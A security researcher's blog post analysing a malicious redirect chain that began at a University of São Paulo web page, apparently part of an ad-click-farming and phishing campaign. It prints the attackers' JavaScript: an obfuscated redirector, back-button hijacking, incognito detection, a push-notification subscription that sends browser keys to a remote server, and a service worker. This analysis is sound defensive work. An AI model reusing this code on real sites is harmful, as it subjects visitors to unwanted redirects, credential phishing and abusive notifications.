---
title: "Analyzing a malicious redirect in a Brazilian university website"
excerpt: "University of São Paulo website was redirecting visitors to a malicious page. Here is how I analyzed it."
date: 2021-02-05T11:05:30-03:00
categories:
  - Cybersecurity
tags:
  - Malware
  - Web
---

## tl;dr

A page in University of São Paulo (USP) website was sending visitors to a page that made the user go through a redirect chain containing multiple shady sites.

A friend and I went through the redirect chain looking for the presence of malware or malicious code. We found some complex obfuscated JavaScript in some pages, but overall there was no clear attempt of infecting the system. No files were downloaded when visiting the pages, and there seems to be no browser exploit of any sort in them. The worst thing we found was an attempt by one of the pages to subscribe the user's browser in a push notification service, but we couldn't make it work to verify what the malicious actor wanted with that.

The conclusion was that the purpose of the redirect chain is to farm clicks in ads. Also, the presence of phishing pages is an indicator of trying to steal credentials. One of the pages we found explicitly asked for the user's email and to create a password to claim your "prize". Obviously, the target was people that use the same password for everything.

## Background

For a brief period, the link [http://www.puspsc.usp.br/](http://www.puspsc.usp.br/) was sending visitors to a malicious redirect chain that went through multiple websites with suspicious domains. Some of these redirects resulted in pishing pages being displayed, and others executed a lot of weird JavaScript in the user's browser.

The original page (http://www.puspsc.usp.br/) belongs to University of São Paulo, one of the major universities in Brazil. The page was quickly fixed after the problem was detected, but we got the link to where it was redirecting. So my friend [Tiago](https://github.com/tiagotriques) and I decided to take a deeper look at it and try to find what was going on with that redirect chain.

## The first link

When the user visited [http://www.puspsc.usp.br/](http://www.puspsc.usp.br/), he or she was redirect to an external page `https[:]//irc[.]lovegreenpencils[.]ga[/]55ryery[?]id=*****&rs=****`. This was the entry point to our analysis. We don't have information if the redirect was always made to this specific page with the same domain and parameters, but we analyzed it from there.

_Note: I will be changing the parameters in URLs with asterisks, to avoid any privacy issue that might arise. The amount of \* is the number of characters the field receives._

This page's sole purpose is to redirect the user to another page: `https[:]//click[.]travelfornamewalking[.]ga[/]zet[.]php[?]id=*******&sid=*******&uid=*******`. However, the parameters in the URL are not always the same (id, sid, and uid changes on each visit to this page). It might indicate that the server is using these fields to keep track of the users or to decide the redirect chain path.

Nothing interesting here. To the next page:

## The second link

The page we were sent to has a very simple obfuscated JavaScript code. It simply converts CharCode into an ascii string:

```js
<html>
  <head>
    <script>
      function doSt() {
        var ml = String.fromCharCode(
          104,116, 116, 112, 115, 58, 47, 47, 99, 97, 108, 108,
          104, 105, 109, 110, 97, 109, 101, 114, 115, 116, 111,
          110, 101, 46, 103, 97, 47, 63, 112, 61, 42, 42, 42,
          42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42,
          42, 42, 42, 42, 42, 42, 42, 42, 38, 115, 117, 98, 49,
          61, 115, 109, 97, 114, 116, 48, 48, 38, 115, 117, 98, 50, 61,
          100, 117, 99, 107, 107, 101, 121
        );
        document.location.href = ml;
        window.location.replace(ml);
      }
      doSt();
    </script>
  </head>

  <body>
    <p>Wait please few seconds...</p>
  </body>
</html>
```

The result is `https[:]//callhimnamerstone[.]ga/[?]p=***********************&sub1=smart00&sub2=duckkey`. Another URL we identified that could be present, instead of what we just decoded, is `https[:]//bitterblackwatter[.]ga/[?]p=***********************&sub1=vivaldi&sub2=blockooon3`. Notice the parameters are always the same in both domains, but the values change.

Again, this is a simple redirect to another page.

## A more interesting link

Now, things started getting more interesting. The URLs we just identified were pages that looked like the following:

![](https://i.imgur.com/pd7nq7K.png)

![](https://i.imgur.com/lgIalDG.png)

Both pages look different, but the source code is almost identical. Only what the user sees is different. The JavaScript code changes slightly too, but the base idea is the same. (Also, the Captcha thing is super fake, it is just an image)

There is a check for the browser's version, more specifically it verifies if the browser is a Chrome/Chromium older than version `74.0.3729.131`. When we first saw it, we thought it could be exploiting some vulnerability in older versions of Chrome.

```js
if (
  guardEnabled &&
  /Chrome/.test(navigator.userAgent || "") &&
  /Google Inc/.test(navigator.vendor || "")
) {
  let version = navigator.userAgent.match(
    /Chrom(?:e|ium)\/([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/
  );
  if (version !== null && compareVersion("74.0.3729.131", version[1]) <= 0) {
    isChrome = true;
  }
}

function compareVersion(v1, v2) {
  if (typeof v1 !== "string") return false;
  if (typeof v2 !== "string") return false;
  v1 = v1.split(".");
  v2 = v2.split(".");
  const k = Math.min(v1.length, v2.length);
  for (let i = 0; i < k; ++i) {
    v1[i] = parseInt(v1[i], 10);
    v2[i] = parseInt(v2[i], 10);
    if (v1[i] > v2[i]) return 1;
    if (v1[i] < v2[i]) return -1;
  }
  return v1.length == v2.length ? 0 : v1.length < v2.length ? -1 : 1;
}
```

Also, there are tailored messages for a lot of languages other than English. These messages match the user's browser language. We concluded this was translated on Google Translator because the Portuguese translation is really bad. This could be indicative that the people responsible for this page are not Brazilian. Also, the default language if the page is not able to get the browser's language is Russian. Might be the case that the author is Russian.

```js
// An example of the messages. Each page had different messages
const MESSAGES = {
  en: {
    title: "... wants to:",
    permission: "Show notifications",
    allow: "Allow",
    disallow: "Block",
  },
  pt: {
    title: "... pede permissão para:",
    permission: "Mostrar notificações",
    allow: "Permitir",
    disallow: "Quadra", // Quadra == block lol
  },
};
MESSAGES.uk = MESSAGES.ru;
MESSAGES.current = MESSAGES[getLanguage()] || MESSAGES.en;
function getLanguage() {
  let language = window.navigator
    ? window.navigator.userLanguage ||
      window.navigator.language ||
      window.navigator.browserLanguage ||
      window.navigator.systemLanguage
    : "ru";
  language = language.substr(0, 2).toLowerCase();
  return language;
}
```

The next interesting part of the code is the following:

```js
function disableHistory() {
  try {
    $(window).on("popstate", function (t) {
      if (t.state) {
        if (Notification.permission === "granted") {
          location.replace(
            "https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2"
          );
        } else {
          location.replace(
            "https[:]//0[.]callhimnamerstone[.]ga/[?]p=***********************&sub1=smart00&sub2=duckkey"
          );
        }
      }
    });
  } catch (error) {}
}
function disableIncognito() {
  var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
  if (fs) {
    fs(
      window.TEMPORARY,
      100,
      function (fs) {},
      function (err) {
        location.href =
          "https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay";
      }
    );
  }
}
disableHistory();
disableIncognito();
```

Looks like they are both changing the behavior of when the user presses the `Go Back` button on the browser, and are doing something if Incognito mode is active. We tried to use the site in incognito, but the page got stuck.

Also, notice the `Notification.permission === "granted"` in the code. It's checking if the page has permission to send notifications to the user. The page also asks the user for this permission:

```js
function CheckS() {
  Notification.requestPermission().then(function () {
    if (Notification.permission === "granted") {
      SubS();
    } else {
      denied();
    }
  });
}
if ("serviceWorker" in navigator) {
  workerInstaller = navigator.serviceWorker.register("/w_15.js").then(() => {
    if (Notification.permission === "granted") {
      window.location.href =
        "https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2";
    } else if (Notification.permission !== "denied") {
      canStart = true;
      if (!isChrome) {
        CheckS();
      }
    } else {
      denied();
    }
  });
}
```

Here we see some logic regarding the previous check about the browser's version too. Right now what we have is:

- If notification is already granted, goes to `https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2` independent of the browser.
- If notification is not granted yet:
  - If it is a Chrome below version `74.0.3729.131`, goes to `denied()`.
  - Else, goes to `CheckS()`. It means there will be an attempt to ask for notification permission.
    - If permission is granted, goes to `SubS()`.
    - Else, goes to `denied()`.

Ok, this is getting kinda hard. The code is easy, but there is a lot of functions and paths to follow. What `SubS()` and `denied()` do?

```js
var denied = function () {
  window.location.href =
    "https[:]//0[.]callhimnamerstone[.]ga/[?]p=***********************&sub1=smart00&sub2=duckkey";
};
```

`denied()` seems to be a simple redirect to a subdomain of the current page. We will check it later.

```js
let myApplicationServerKey = urlB64ToUint8Array(
  "***************************************************************************************"
);
let workerInstaller = null;
function getWorkerRegistration() {
  return workerInstaller.then(() => navigator.serviceWorker.ready);
}
function SubS() {
  return getWorkerRegistration()
    .then((registration) =>
      registration.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: myApplicationServerKey,
      })
    )
    .then((sub) => {
      let gmt = -new Date().getTimezoneOffset() / 60;
      let rawKey = sub.getKey ? sub.getKey("p256dh") : "";
      let key = rawKey
        ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey)))
        : "";
      let rawAuthSecret = sub.getKey ? sub.getKey("auth") : "";
      let authSecret = rawAuthSecret
        ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawAuthSecret)))
        : "";
      return fetch(
        "/?push=**************************************************************&land=**",
        {
          method: "POST",
          mode: "no-cors",
          body: JSON.stringify({
            id: sub.endpoint,
            key: key,
            secret: authSecret,
            gmt: gmt,
            uri: window.location.href,
          }),
        }
      );
    })
    .then(() => {
      window.location.href =
        "https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2";
    })
    .catch(() => {
      denied();
    });
}
```

That's interesting. The page seems to be subscribing the user's browser to a Push service using `registration.pushManager`. We couldn't make it work to see what kind of message it would display. Finally, the user is redirected to `https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2`

Notice that `w_15.js` is being loaded. What this script does is just load another script, `https[:]//allowandgo[.]club/sw/w_11[.]js`. This file adds event listeners for some actions:

```js
"use strict";
var host = "https[:]//allowandgo[.]club/";
self.addEventListener("install", function (event) {
  event.waitUntil(self.skipWaiting());
});
self.addEventListener("activate", function (event) {
  event.waitUntil(clients.claim());
});
self.addEventListener("push", function (event) {
  event.waitUntil(
    self.registration.pushManager
      .getSubscription()
      .then(function (subscription) {
        return fetch(
          host +
            "?endpoint=" +
            subscription.endpoint.split("/").pop() +
            "&ver=2"
        ).then(function (response) {
          return response.json().then(function (data) {
            return self.registration.showNotification(data.title, data.body);
          });
        });
      })
  );
});
self.addEventListener("notificationclick", function (event) {
  const target = event.notification.data.url;
  event.notification.close();
  event.waitUntil(
    clients
      .matchAll({
        type: "window",
        includeUncontrolled: true,
      })
      .then(function (clientList) {
        for (var i = 0; i < clientList.length; i++) {
          var client = clientList[i];
          if (client.url == target && "focus" in client) {
            return client.focus();
          }
        }
        return clients.openWindow(target);
      })
  );
});
```

The interesting event here is `push`. It seems to fetch an endpoint and display a message to the user. We also couldn't make it work to see what message was displayed.

So, that's pretty much it for this page. There is no sign of any exploit or downloaded file. The browser version check was probably something related to compatibility with the notification feature. We couldn't verify the purpose of the push notification subscription.

Let's now check the other URLs that the user can be redirected from this page.

## Some really obfuscated JavaScript

The first URL of interest is `https[:]//0[.]callhimnamerstone[.]ga/[?]p=***********************&sub1=smart00&sub2=duckkey`. The concept of this page is exactly the same as the previous one, checking a lot of things and trying to redirect the user. Each time we visited this link, we got a different source code, displaying different pages:

![](https://i.imgur.com/5R0DDOQ.png)

![](https://i.imgur.com/rYRnFQY.png)

Looks like here the notification button works. However, when we click it, the console displays an error and nothing happens.

I got different JavaScript code each time I visited this page. All of them had the logic to test the browser version and try to subscribe the user in the Push notification. But some of them had different things too. One had a super obfuscated JavaScript that was creating functions by appending individual chars and "cryptographed" text. We couldn't make sense of what was the purpose of it, as we couldn't deobfuscate it.

The page then redirected the user to somewhere else. There are multiple subdomains associated with this page, like `https[:]//1[.]callhimnamerstone[.]ga/`, `https[:]//2[.]callhimnamerstone[.]ga/`, `https[:]//0.bitterblackwatter[.]ga/`, etc.

The other link was `https[:]//url-partners[.]g2afse[.]com/click[?]pid=****&offer_id=11&sub2=tonvay2`. This one is easier, it is just a redirect to yet another website, `http[:]//bestprize-places-here1[.]life/[?]u=*******&o=*******&t=****&cid=**************`. We identified that changing `offer_id` in the URL changed the resulting redirect chain from here. So the pages can be enumerated by changing this parameter.

The conclusion in this part was that the first page is trying to subscribe the browser in the push thing multiple times and only then proceeds with the chain.

## Another really obfuscated JS

The page `http[:]//bestprize-places-here1[.]life/[?]u=*******&o=*******&t=****&cid=**************` displayed a message "loading", and the source code was an obfuscated JS. The name of the function is `CryptoJS`, so you can imagine what was there. A simple example of the more than 1000 lines code:

```js
stringify: function(t) {
    for (var e = t.words, r = t.sigBytes, i = [], n = 0; n < r; n++) {
        var o = e[n >>> 2] >>> 24 - n % 4 * 8 & 255;
        i.push((o >>> 4).toString(16)), i.push((15 & o).toString(16))
    }
    return i.join("")
},
parse: function(t) {
    for (var e = t.length, r = [], i = 0; i < e; i += 2) r[i >>> 3] |= parseInt(t.substr(i, 2), 16) << 24 - i % 8 * 4;
    return new u.init(r, e / 2)
}
```

We also couldn't deobfuscate it. But a simple dynamic analysis concluded that this is probably some bait code to hinder reverse engineering, and the page's sole purpose might be to just redirect the user again.

![](https://i.imgur.com/JXkzE3E.png)

## A loooot of redirections

I will make things short here and say that what comes next is just a bunch of redirects that eventually land in some phishing or shady NSFW website. This is an image of Burp showing the entire redirect chain. This is just one possible chain, we identified multiple others.

![](https://i.imgur.com/vQSsVLd.png)

Right around here we started thinking that this is just a simple click farm and phishing campaign. There does not seem to be any weird behavior in the system after accessing these websites, and most of the pages are just redirects. We stopped going too deep on the JavaScript and concluded the objective of these pages is to farm clicks in ads and steal credentials.

And here are some of the pages that are shown when following the chain:

![](https://i.imgur.com/qnj4HSE.png)

![](https://i.imgur.com/IJi1pfM.png)

In the end, the user is sent to a real, legit page, like `google.com`. We identified that the user is sent to a page from his own country (we received Brazilian websites, and when connecting to Germany through a VPN, we were sent to a site in german).

![](https://i.imgur.com/jwm1zQq.png)

To finish, let's talk about all these domains. The `.ga` domains are free domains available for anyone to grab. So it is really interesting for malicious actors to use them in the phishing campaign.

There are other pages with `.com` for example. We did a superficial check in some of the domains, but we couldn't find anything. Might be interesting to check it with more diligence as follow-up research.
